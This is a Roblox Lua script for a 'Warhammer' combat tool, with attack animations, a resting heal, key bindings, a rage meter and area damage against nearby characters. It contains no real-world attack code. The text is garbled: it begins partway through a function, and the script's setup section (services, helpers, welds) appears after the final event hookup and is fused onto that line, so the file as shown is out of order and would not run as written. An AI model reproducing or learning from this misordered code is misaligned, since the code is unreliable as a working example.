                RLW.C0 = RLWStand * CFrame.Angles(math.rad(-10+25-15*i), 0, 0) * CFrame.new(0, 0.5-0.5*i, -0.8+0.8*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-10-35+45*i), 0, 0) * CFrame.new(0, 0.4-0.4*i, 0.2-0.2*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-15-10+25*i), 0, 0) * CFrame.new(0, 0, -0.5+0.7-0.2*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-40+75-35*i), 0, math.rad(-20+20*i))
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = Orig.p + Vector3.new(0, 15.1-16.7+1.6*i, 0)
                wait()
        end
        normal()
        bg:remove()
        bp:remove()
        end
end
 
function flipsmash(mouse)
        local Orig = torso.CFrame
        local mouseHit = mouse
        local CF = ComputePos(Orig.p, mouseHit)
        local p, t = RayCast(torso.Position, torso.Position + Vector3.new(0, -5, 0), 5, 0.5)
        local ahp = (CF * CFrame.new(0, 0, -14.5))
        local p2, t2 = RayCast(ahp.p, (ahp * CFrame.new(0, -5, 0)).p, 5, 0.5)
        if t and t2 and Prop.Rage >= 90 then
        Prop.Rage = Prop.Rage - 90
        attach()
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.position = Orig.p
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bg.cframe = CF
        local cen = CF * CFrame.new(0, -1.2, -1.5-6.5)
        for i = 0, 1, 0.08 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-100*i), math.rad(-50*i), math.rad(-50*i)) * CFrame.new(0.2*i, 0, 0.2*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100*i), 0, math.rad(-40*i)) * CFrame.new(-0.2*i, -0.4*i, 0.5*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15*i), 0, math.rad(-10*i)) * CFrame.new(0, 0.7*i, -1*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75*i), 0, math.rad(10*i)) * CFrame.new(0, 0.4*i, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6*i)
                neck.C0 = necko * CFrame.Angles(math.rad(30*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = CF * CFrame.new(0, -1.2*i, -1.5*i).p
                wait()
        end
        wait(0.15)
        hum.PlatformStand = true
        for i = 0, 1, 0.13 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-100-70*i), math.rad(-50), math.rad(-50)) * CFrame.new(0.2, 0, 0.2)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100-50*i), 0, math.rad(-40+30*i)) * CFrame.new(-0.2, -0.4, 0.5)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15-10*i), 0, math.rad(-10)) * CFrame.new(0, 0.7-0.7*i, -1+1*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-75+70*i), 0, math.rad(10)) * CFrame.new(0, 0.4-0.4*i, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6)
                neck.C0 = necko * CFrame.Angles(math.rad(30-40*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.rad(-90*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(180-45*i), 0, 0) * CFrame.new(0, 0, -6.5).p
                wait()
        end
        PlaySound(slash)
        for i = 0, 1, 0.13 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-100-70-80*i), math.rad(-50+60*i), math.rad(-50+90*i)) * CFrame.new(0.2-0.2*i, -0.85*i, 0.2-0.2*i)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-100-50-125*i), 0, math.rad(-40+30+45*i)) * CFrame.new(-0.2+0.2*i, -0.4-0.5*i, 0.5-0.5*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(5), 0, math.rad(-10)) * CFrame.new(0, 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-5), 0, math.rad(10)) * CFrame.new(0, 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 1.6-2.6*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-10), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.rad(-90-90*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(180-45-45*i), 0, 0) * CFrame.new(0, 0, -6.5).p
                wait()
        end
        StartEffect(maintip)
        PlaySound(slash)
        for i = 0, 1, 0.06 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150*i), math.rad(10-50*i), math.rad(40-85*i)) * CFrame.new(0, -0.85+0.45*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-130*i), 0, math.rad(35)) * CFrame.new(0, -0.9+0.3*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(5-80*i), 0, math.rad(-10)) * CFrame.new(0, 0.4*i, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-5+20*i), 0, math.rad(10)) * CFrame.new(0, 0.7*i, -1*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-35+10*i), 0, 0) * CFrame.new(0, 0, 1.6-2.6)
                neck.C0 = necko * CFrame.Angles(math.rad(-10+50*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.rad(-180-190*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(90-90*i), 0, 0) * CFrame.new(0, 0, -6.5).p
                wait()
        end
        coroutine.resume(coroutine.create(function()
                local frr = Cam.CoordinateFrame
                for i = 1, math.random(13,20) do
                        wait()
                        Cam.CoordinateFrame = frr * CFrame.new(math.random(-15,15)/10, math.random(-15,15)/10, math.random(-15,15)/10)
                end
        end))
        PlaySound(smashsound)
        PlaySound(boomboom)
        EndEffect()
        local poo = Vector3.new(maintip.Position.x, t2.Position.y + t2.Size.y/2, maintip.Position.z)
        local siz = math.random(65,115)/10
        local partie = Part(workspace, true, false, 1, 0, "White", siz, 0.2, siz, true)
        partie.CFrame = CFrame.new(poo) * CFrame.Angles(0, math.rad(math.random(0, 360)), 0)
        local decc = Instance.new("Decal",partie)
        decc.Shiny = 0
        decc.Specular = 0
        decc.Texture = "http://www.roblox.com/asset/?id=49173398"
        decc.Face = "Top"
        local count = 0
        for i, v in pairs(workspace:children()) do
                local h = getHumanoid(v)
                local to = v:findFirstChild("Torso")
                if h ~= nil and to ~= nil then
                        if (to.Position - poo).magnitude < 15 then
                                count = count + 1
                                local Maxhp = h.MaxHealth
                                if Maxhp > 5000 then Maxhp = 5000 end
                                damage(h, to, 0.5, 0, Maxhp+5)
                                to.Velocity = CFrame.new(poo, to.Position).lookVector * 30
                                to.Velocity = to.Velocity + Vector3.new(0, 60, 0)
                                to.RotVelocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
                                h.PlatformStand = true
                                coroutine.resume(coroutine.create(function() wait(1.2) h.PlatformStand = false end))
                                if count >= 2 then break end
                        end
                end
        end
        coroutine.resume(coroutine.create(function() wait(math.random(7,14)) partie:remove() end))
        wait(0.6)
        for i = 0, 1, 0.06 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(110-150+40*i), math.rad(10-50+40*i), math.rad(40-85+45*i)) * CFrame.new(0, -0.85+0.45+0.4*i, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(85-130+45*i), 0, math.rad(35-35*i)) * CFrame.new(0, -0.9+0.3+0.6*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(5-80+75*i), 0, math.rad(-10+10*i)) * CFrame.new(0, 0.4-0.4*i, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-5+20-15*i), 0, math.rad(10-10*i)) * CFrame.new(0, 0.7-0.7*i, -1+1*i)
                HW.C0 = HWStand * CFrame.Angles(math.rad(-35+10+25*i), 0, 0) * CFrame.new(0, 0, 1.6-2.6+1*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-10+50-40*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = cen * CFrame.new(0, 1.2*i, -6.5).p
                wait()
        end
        hum.PlatformStand = false
        normal()
        bg:remove()
        bp:remove()
        end
end
 
function spin(mouse)
        attach()
        local mouseHit = mouse
        local Orig = torso.CFrame
        local CF = ComputePos(Orig.p, mouseHit)
        local p, t = RayCast(torso.Position, CF * CFrame.new(0, -7, -1.5).p, 5, 0.5)
        if t then
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.position = Orig.p
        bg.cframe = CF
        PlaySound(slash)
        for i = 0, 1, 0.11 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(20*i), math.rad(120*i), math.rad(20*i)) * CFrame.new(0, 0, 0)
                RAW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100*i), 0, math.rad(20*i))
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60*i), 0, math.rad(40*i)) * CFrame.new(0, -0.8*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(10*i), 0, 0) * CFrame.new(0, 0.3*i, -0.2*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-25*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0)
                neck.C0 = necko * CFrame.Angles(math.rad(-15*i), 0, math.rad(-30*i))
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                wait()
        end
        local posg = CF * CFrame.new(0, -0.6, -4)
        PlaySound(hitsound, 0.9)
        for i = 0, 1, 0.13 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(20-20*i), math.rad(120+10*i), math.rad(20)) * CFrame.new(0, -0.8*i, 0.4*i)
                RAW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100-60*i), 0, math.rad(20-20*i))
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60-40*i), 0, math.rad(40-50*i)) * CFrame.new(0, -0.8+0.3*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(10-10*i), 0, 0) * CFrame.new(0, 0.3-0.3*i, -0.2+0.2*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-25+25*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35*i)) * CFrame.new(0, 0, -0.6*i)
                neck.C0 = necko * CFrame.Angles(math.rad(-15+25*i), 0, math.rad(-30+30*i))
                bg.cframe = CF * CFrame.Angles(0, 0, 0)
                bp.position = CF * CFrame.new(0, 1*i, -2*i).p
                wait()
        end
        hum.PlatformStand = true
        bg.Parent = handle
        bg.cframe = CF * CFrame.Angles(math.pi, math.pi, 0)
        bp.Parent = handle
        bp.position = posg.p
        StartEffect(Lleg)
        Leghurt = true
        PlaySound(slash)
        for i = 0, 1, 0.09 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-90*i), math.rad(130-40*i), math.rad(20-40*i)) * CFrame.new(0, -0.8+0.8*i, 0.4-0.4*i)
                RAW.C1 = CFrame.new(0, 0.5+0.5*i, 0) * CFrame.Angles(math.rad(100-60+60*i), 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60-40-20+60*i), 0, math.rad(40-50+10*i)) * CFrame.new(0, -0.8+0.3-0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-20*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35)) * CFrame.new(0, 0, 1*i)
                neck.C0 = necko * CFrame.Angles(math.rad(10-35*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.pi, math.pi+math.rad(90*i), 0)
                wait()
        end
        for i = 0, 1, 0.055 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-90), math.rad(90), math.rad(-20)) * CFrame.new(0, 0, 0)
                RAW.C1 = CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(100), 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60), 0, 0) * CFrame.new(0, -1, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15+10*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-20-5*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35)) * CFrame.new(0, 0, 1)
                neck.C0 = necko * CFrame.Angles(math.rad(-25), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.pi, math.pi+math.rad(90+270*i), 0)
                wait()
        end
        EndEffect()
        Leghurt = false
        for i = 0, 1, 0.12 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(-90+90*i), math.rad(90+40*i), math.rad(-20+40*i)) * CFrame.new(0, -0.8*i, 0.4*i)
                RAW.C1 = CFrame.new(0, 1-0.5*i, 0) * CFrame.Angles(math.rad(100-60*i), 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(60-60*i), 0, 0) * CFrame.new(0, -1+0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(15+10-25*i), 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(-20-5+25*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35)) * CFrame.new(0, 0, 1)
                neck.C0 = necko * CFrame.Angles(math.rad(-25+25*i), 0, 0)
                bg.cframe = CF * CFrame.Angles(math.pi, math.pi+math.rad(360), 0)
                wait()
        end
        bg.Parent = torso
        bp.Parent = torso
        bg.cframe = CF
        for i = 0, 1, 0.14 do
                RAW.C0 = RAWStand * CFrame.Angles(0, math.rad(90+40-130*i), math.rad(-20+40-20*i)) * CFrame.new(0, -0.8+0.8*i, 0.4-0.4*i)
                RAW.C1 = CFrame.new(0, 0.5, 0) * CFrame.Angles(math.rad(100-60-40*i), 0, 0)
                LAW.C0 = LAWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, -1+0.5+0.5*i, 0)
                RLW.C0 = RLWStand * CFrame.Angles(0, 0, 0)
                LLW.C0 = LLWStand * CFrame.Angles(0, 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, math.rad(-35+35*i)) * CFrame.new(0, 0, 1-1*i)
                neck.C0 = necko * CFrame.Angles(0, 0, 0)
                bp.position = CF * CFrame.new(0, 0, -2+1*i).p
                bg.cframe = CF
                wait()
        end
        hum.PlatformStand = false
        normal()
        bg:remove()
        bp:remove()
        end
end
 
function rest()
        local Orig = torso.CFrame
        local CF = ComputePos(Orig.p, Orig * CFrame.new(0, 0, -5).p)
        local p, t = RayCast(CF.p, CF * CFrame.new(0, -6, 0.5).p, 6, 0.5)
        if t then
        attach()
        local bg = Add.BG(torso)
        local bp = Add.BP(torso)
        bp.maxForce = Vector3.new(math.huge, math.huge, math.huge)
        bp.position = CF.p
        bg.cframe = CF
        local cen = CF * CFrame.new(0, -2.5, 0)
        RestingAnim = true
        hum.PlatformStand = true
        local standup = function()
                Resting = false
                bp.Parent = torso
                cen = ComputePos(torso.CFrame.p, torso.CFrame * CFrame.new(0, 0, -5).p) * CFrame.new(0, 0, -2.5)
                for i = 1, 0, -0.12 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(50), math.rad(-20-20*i), math.rad(60*i))
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40-70*i), 0, math.rad(-30-10*i)) * CFrame.new(0, -0.6*i, 0.4+0.2*i)
                        RLW.C0 = RLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(15)) * CFrame.new(0, 0, -0.4)
                        LLW.C0 = LLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(-15)) * CFrame.new(0, 0, -0.4)
                        neck.C0 = necko * CFrame.Angles(math.rad(10-15*i), 0, 0)
                        HW.C0 = HWStand * CFrame.Angles(math.rad(40*i), 0, 0) * CFrame.new(0, 0, 0.2+0.8*i)
                        bg.cframe = CF * CFrame.Angles(math.rad(-10+20*i), 0, 0)
                        bp.position = cen * CFrame.Angles(math.rad(180+45+45*i), 0, 0) * CFrame.new(0, -2.5, 0.4*i).p
                        wait()
                end
                for i = 1, 0, -0.17 do
                        RAW.C0 = RAWStand * CFrame.Angles(math.rad(50*i), math.rad(-20*i), 0)
                        LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40*i), 0, math.rad(-30*i)) * CFrame.new(0, 0, 0.4*i)
                        RLW.C0 = RLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(15*i)) * CFrame.new(0, -0.4*i, -0.4*i)
                        LLW.C0 = LLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(-15*i)) * CFrame.new(0, -0.4*i, -0.4*i)
                        neck.C0 = necko * CFrame.Angles(math.rad(10*i), 0, 0)
                        HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0.2*i)
                        bg.cframe = CF * CFrame.Angles(math.rad(-10*i), 0, 0)
                        bp.position = cen * CFrame.Angles(math.rad(180+45*i), 0, 0) * CFrame.new(0, -2.5, 0).p
                        wait()
                end
                hum.PlatformStand = false
                bg:remove()
                bp:remove()
                normal()
                Able = true
                RestingAnim = false
        end
        local connec = hum.Changed:connect(function()
                if hum.PlatformStand == false then
                        coroutine.resume(coroutine.create(function()
                                standup()
                        end))
                        standup = nil
                        connec:disconnect()
                end
        end)
        local lasthp = hum.Health
        local conn = hum.HealthChanged:connect(function(hp)
                if lasthp - hp > 0.8 then
                        hum.PlatformStand = false
                        conn:disconnect()
                end
                lasthp = hp
        end)
        coroutine.resume(coroutine.create(function()
                repeat wait() until Resting
                while Resting do
                        wait()
                        if torso.Velocity.magnitude > 4 then
                                hum.PlatformStand = false
                                break
                        end
                end
        end))
        for i = 0, 1, 0.1 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(50*i), math.rad(-20*i), 0)
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40*i), 0, math.rad(-30*i)) * CFrame.new(0, 0, 0.4*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(15*i)) * CFrame.new(0, 0, -0.4*i)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(55*i), 0, math.rad(-15*i)) * CFrame.new(0, 0, -0.4*i)
                neck.C0 = necko * CFrame.Angles(math.rad(10*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(0, 0, 0) * CFrame.new(0, 0, 0.2*i)
                bg.cframe = CF * CFrame.Angles(math.rad(-10*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(180+45*i), 0, 0) * CFrame.new(0, -2.5, 0).p
                wait()
        end
        for i = 0, 1, 0.07 do
                RAW.C0 = RAWStand * CFrame.Angles(math.rad(50), math.rad(-20-20*i), math.rad(60*i))
                LAW.C0 = LAWStand * CFrame.Angles(math.rad(-40-70*i), 0, math.rad(-30-10*i)) * CFrame.new(0, -0.6*i, 0.4+0.2*i)
                RLW.C0 = RLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(15)) * CFrame.new(0, -0.4*i, -0.4)
                LLW.C0 = LLWStand * CFrame.Angles(math.rad(55+25*i), 0, math.rad(-15)) * CFrame.new(0, -0.4*i, -0.4)
                neck.C0 = necko * CFrame.Angles(math.rad(10-15*i), 0, 0)
                HW.C0 = HWStand * CFrame.Angles(math.rad(40*i), 0, 0) * CFrame.new(0, 0, 0.2+0.8*i)
                bg.cframe = CF * CFrame.Angles(math.rad(-10+20*i), 0, 0)
                bp.position = cen * CFrame.Angles(math.rad(180+45+45*i), 0, 0) * CFrame.new(0, -2.5, 0.4*i).p
                wait()
        end
        Resting = true
        coroutine.resume(coroutine.create(function()
                wait(0.4)
                bp.Parent = nil
        end))
        coroutine.resume(coroutine.create(function()
                while Resting and selected do
                        wait(math.random(350,800)/1000)
                        hum.Health = hum.Health + math.random(1,2)
                        Prop.Rage = Prop.Rage + 1
                end
                hum.PlatformStand = false
        end))
        end
end
 
function select(mouse)
        mouse.Icon = MouseIc
        selectanim()
        selected = true
        mouse.Button1Down:connect(function()
                if Able and RestingAnim == false and hum.Sit == false then
                        Able = false
                        swing(mouse.Hit.p)
                        Able = true
                end
        end)
        mouse.Button1Down:connect(function()
                mouse.Icon = MouseDo
                mouse.Button1Up:wait()
                mouse.Icon = MouseIc
        end)
        mouse.KeyDown:connect(function(key)
                key = key:lower()
                if Able and RestingAnim == false and hum.Sit == false then
                if key == "q" then
                        Able = false
                        smash(mouse.Hit.p)
                        Able = true
                elseif key == "e" then
                        Able = false
                        swing(mouse.Hit.p)
                        Able = true
                elseif key == "r" then
                        Able = false
                        stab(mouse.Hit.p)
                        Able = true
                elseif key == "f" then
                        Able = false
                        epicsmash(mouse.Hit.p)
                        Able = true
                elseif key == "z" then
                        Able = false
                        shockwave(mouse.Hit.p)
                        Able = true
                elseif key == "x" then
                        Able = false
                        flipsmash(mouse.Hit.p)
                        Able = true
                elseif key == "t" then
                        Able = false
                        spin(mouse.Hit.p)
                        Able = true
                end
                end
                if Able then
                        if key == "g" and AbleG then
                                AbleG = false
                                if Resting == true then
                                        Resting = false
                                else
                                        rest()
                                end
                                wait(0.8)
                                AbleG = true
                        end
                end
        end)
end
 
function deselect(mouse)
        selected = false
        deselanim()
end
bin.Selected:connect(select)
bin.Deselected:connect(deselect)Ancor = game:GetService("Players")
 
me = Ancor.LocalPlayer
char = me.Character
Modelname = "Warhammah"
Toolname = "Warhammar"
Surfaces = {"FrontSurface", "BackSurface", "TopSurface", "BottomSurface", "LeftSurface", "RightSurface"}
necko = CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
selected = false
effectOn = false
Hurt = false
Leghurt = false
Deb = true
LegDeb = true
Able = true
Resting = false
RestingAnim = false
AbleG = true
Prop = {Damage = 62, Legdmg = 50, AS = 90, ShockDMG = 50, Rage = 1000000, RageIncome = 1, MaxRage = 1000000}
Prop.AS = Prop.AS/300
Cam = workspace.CurrentCamera
 
ToolIcon = "http://www.roblox.com/asset/?id=49192762"
MouseIc = "http://www.roblox.com/asset/?id=49192792"
MouseDo = "http://www.roblox.com/asset/?id=49192819"
 
Add = {
        Sphere = function(P)
                local m = Instance.new("SpecialMesh",P)
                m.MeshType = "Sphere"
                return m
        end,
        BF = function(P)
                local bf = Instance.new("BodyForce",P)
                bf.force = Vector3.new(0, P:GetMass()*187, 0)
                return bf
        end,
        BP = function(P)
                local bp = Instance.new("BodyPosition",P)
                bp.maxForce = Vector3.new(math.huge, 0, math.huge)
                bp.P = 14000
                return bp
        end,
        BG = function(P)
                local bg = Instance.new("BodyGyro",P)
                bg.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
                bg.P = 14000
                return bg
        end,
        Mesh = function(P, ID, x, y, z)
                local m = Instance.new("SpecialMesh")
                m.MeshId = ID
                m.Scale = Vector3.new(x, y, z)
                m.Parent = P
                return m
        end,
        Sound = function(P, ID, vol, pitch)
                local s = Instance.new("Sound")
                s.SoundId = ID
                s.Volume = vol
                s.Pitch = pitch
                s.Parent = P
                return s
        end
}
 
function find(tab, arg)
        local ah = nil
        for i,v in pairs(tab) do
                if v == arg then
                        ah = v
                end
        end
        return ah
end
 
function getAllParts(from)
        local t = {}
        function getParts(where)
                for i, v in pairs(where:children()) do
                        if v:IsA("BasePart") then
                                if v.Parent ~= char and v.Parent.Parent ~= char then
                                        table.insert(t, v)
                                end
                        end
                        getParts(v)
                end
        end
        getParts(workspace)
        return t
end
 
function RayCast(pos1, pos2, maxDist, forward)
        local list = getAllParts(workspace)
        local pos0 = pos1
        for dist = 1, maxDist, forward do
                pos0 = (CFrame.new(pos1, pos2) * CFrame.new(0, 0, -dist)).p
                for _, v in pairs(list) do
                        local pos3 = v.CFrame:pointToObjectSpace(pos0)
                        local s = v.Size
                        if pos3.x > -(s.x/2) and pos3.x < (s.x/2) and pos3.y > -(s.y/2) and pos3.y < (s.y/2) and pos3.z > -(s.z/2) and pos3.x < (s.z/2) and v.CanCollide and v:GetMass() > 14 then
                                return pos0, v
                        end
                end
        end
        return pos0, nil
end
 
function Part(Parent, Anchor, Collide, Tran, Ref, Color, X, Y, Z, Break)
        local p = Instance.new("Part")
        p.formFactor = "Custom"
        p.Anchored = Anchor
        p.CanCollide = Collide
        p.Transparency = Tran
        p.Reflectance = Ref
        p.BrickColor = BrickColor.new(Color)
        for _, Surf in pairs(Surfaces) do
                p[Surf] = "Smooth"
        end
        p.Size = Vector3.new(X, Y, Z)
        if Break then
                p:BreakJoints()
        else p:MakeJoints() end
        p.Parent = Parent
        p.Locked = true
        return p
end
 
function Weld(p0, p1, x, y, z, a, b, c)
        local w = Instance.new("Weld")
        w.Parent = p0
        w.Part0 = p0
        w.Part1 = p1
        w.C1 = CFrame.new(x,y,z) * CFrame.Angles(a,b,c)
        return w
end
 
function ComputePos(pos1, pos2)
        local pos3 = Vector3.new(pos2.x, pos1.y, pos2.z)
        return CFrame.new(pos1, pos3)
end
 
function getHumanoid(c)
        local h = nil
        for i,v in pairs(c:children()) do
                if v:IsA("Humanoid") and c ~= char then
                        if v.Health > 0 then
                                h = v
                        end
                end
        end
        return h
end
 
for i,v in pairs(char:children()) do
        if v.Name == Modelname then
                v:remove()
        end
end
 
pcall(function() me.PlayerGui:findFirstChild("RaigMeter",true):remove() end)
 
Sc = Instance.new("ScreenGui",me:findFirstChild("PlayerGui"))
Sc.Name = "RaigMeter"
 
Fr = Instance.new("Frame",Sc)
Fr.Size = UDim2.new(0, 250, 0, 28)
Fr.Position = UDim2.new(0.5, -125, 0, 5)
Fr.BackgroundColor3 = Color3.new(0.8, 0.3, 0.1)
 
Met = Instance.new("Frame", Fr)
Met.Size = UDim2.new(1, -10, 1, -6)
Met.Position = UDim2.new(0, 5, 0, 3)
Met.BackgroundColor3 = Color3.new(0, 0, 0)
Met.BorderSizePixel = 0
 
Meter = Instance.new("ImageLabel", Met)
Meter.Size = UDim2.new(Prop.Rage/Prop.MaxRage, 0, 1, -2)
Meter.Position = UDim2.new(0, 0, 0, 1)
Meter.Image = "http://www.roblox.com/asset/?id=48965808"
Meter.BorderSizePixel = 0
Meter.BackgroundColor3 = Color3.new(1, 0.6, 0.1)
 
Tx = Instance.new("TextLabel", Met)
Tx.Size = UDim2.new(0, 0, 1, 0)
Tx.Position = UDim2.new(0, 5, 0, 0)
Tx.Text = Prop.Rage.." / "..Prop.MaxRage
Tx.Font = "ArialBold"
Tx.FontSize = "Size18"
Tx.BackgroundTransparency = 1
Tx.TextColor3 = Color3.new(1, 0, 0)
Tx.TextXAlignment = "Left"
 
laast = Prop.Rage
coroutine.resume(coroutine.create(function()
        while true do
                wait()
                if Prop.Rage > Prop.MaxRage then Prop.Rage = Prop.MaxRage end
                if laast ~= Prop.Rage then
                        Meter.Size = UDim2.new(Prop.Rage/Prop.MaxRage, 0, 1, -2)
                        laast = Prop.Rage
                        Tx.Text = Prop.Rage.." / "..Prop.MaxRage
                end
        end
end))
 
torso = char.Torso
neck = torso.Neck
hum = char.Humanoid
Rarm = char["Right Arm"]
Larm = char["Left Arm"]
Rleg = char["Right Leg"]
Lleg = char["Left Leg"]
 
hc = Instance.new("Humanoid")
hc.Health = 0
hc.MaxHealth = 0
 
slash = Add.Sound(nil, "rbxasset://sounds//swordslash.wav", 0.9, 0.8)
hitsound = Add.Sound(nil, "http://www.roblox.com/asset/?id=2801263", 0.7, 0.6)
charge = Add.Sound(nil, "http://www.roblox.com/asset/?id=2101137", 0.8, 0.65)
boom = Add.Sound(nil, "http://www.roblox.com/asset/?id=2691586", 0.8, 0.3)
smashsound = Add.Sound(nil, "http://www.roblox.com/asset/?id=2692806", 0.8, 0.35)
boomboom = Add.Sound(nil, "http://www.roblox.com/asset/?id=2760979", 1, 0.18)
equip = Add.Sound(nil, "rbxasset://sounds\\unsheath.wav", 0.6, 0.7)
 
function PlaySound(sound, pitch)
        local s = sound:clone()
        if pitch ~= nil then
                if tonumber(pitch) then
                        s.Pitch = tonumber(pitch)
                end
        end
        s.Parent = torso
        s.PlayOnRemove = true
        coroutine.resume(coroutine.create(function()
                wait()
                s:remove()
        end))
end
 
Mo = Instance.new("Model")
Mo.Name = Modelname
 
RABrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
LABrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
RLBrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
LLBrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)
 
RABW = Weld(torso, RABrick, -1.5, -0.5, 0, 0, 0, 0)
LABW = Weld(torso, LABrick, 1.5, -0.5, 0, 0, 0, 0)
RLBW = Weld(torso, RLBrick, -0.5, 1.2, 0, 0, 0, 0)
LLBW = Weld(torso, LLBrick, 0.5, 1.2, 0, 0, 0, 0)
 
RAW = Weld(RABrick, nil, 0, 0.5, 0, 0, 0, 0)
LAW = Weld(LABrick, nil, 0, 0.5, 0, 0, 0, 0)
RLW = Weld(RLBrick, nil, 0, 0.8, 0, 0, 0, 0)
LLW = Weld(LLBrick, nil, 0, 0.8, 0, 0, 0, 0)
 
HB = Part(Mo, false, false, 1, 0, "Really black", 0.1, 0.1, 0.1, true)
HBW = Weld(Rarm, HB, 0, 1, 0, 0, 0, 0)
HW = Weld(HB, nil, 0, -1.3, 0, math.pi/2, 0, 0)
 
TH = Weld(torso, nil, -0.8, 0.1, 0, 0, math.pi/2, math.rad(-140))
 
RAWStand, LAWStand, RLWStand, LLWStand, HWStand = nil
 
